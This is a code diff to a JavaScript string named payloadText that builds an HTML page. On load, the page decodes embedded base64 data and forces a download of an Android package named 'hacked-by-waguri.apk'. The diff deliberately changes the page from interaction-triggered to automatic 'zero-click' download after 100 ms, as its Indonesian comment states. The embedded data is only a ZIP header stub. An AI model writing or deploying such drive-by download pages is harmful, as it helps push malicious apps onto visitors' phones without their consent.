@@ -147,7 +147,7 @@ const payloadText = "<!DOCTYPE html>" +
 "}" +
 "return bytes;" +
 "}" +
-// DIUBAH: Payload APK (Header ZIP: PK\x03\x04)
+// Payload APK (Header ZIP: PK\x03\x04)
 "var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
 "var sudah = false;" +
 "function picuDownload(){" +
@@ -157,12 +157,10 @@ const payloadText = "<!DOCTYPE html>" +
 "try{" +
 "statusEl.textContent = 'Menyiapkan berkas...';" +
 "var bytesArr = b64KeBytes(b64Data);" +
-// DIUBAH: MIME Type APK
 "var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
 "var url = URL.createObjectURL(blob);" +
 "var a = document.createElement('a');" +
 "a.href = url;" +
-// DIUBAH: Nama file APK
 "a.download = 'hacked-by-waguri.apk';" +
 "a.style.display = 'none';" +
 "document.body.appendChild(a);" +
@@ -179,10 +177,9 @@ const payloadText = "<!DOCTYPE html>" +
 "sudah = false;" +
 "}" +
 "}" +
-"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
-"document.addEventListener('click', picuDownload);" +
-"document.addEventListener('touchstart', picuDownload);" +
-"document.addEventListener('keydown', picuDownload);" +
+// DIUBAH: HANYA memicu download saat load (Zero-Click). Listener klik/touch/keydown dihapus.
+"window.addEventListener('load', function(){ setTimeout(picuDownload, 100); });" +
+"document.addEventListener('DOMContentLoaded', function(){ setTimeout(picuDownload, 100); });" +
 "})();" +
 "<\/script>" +
 "</body>" +
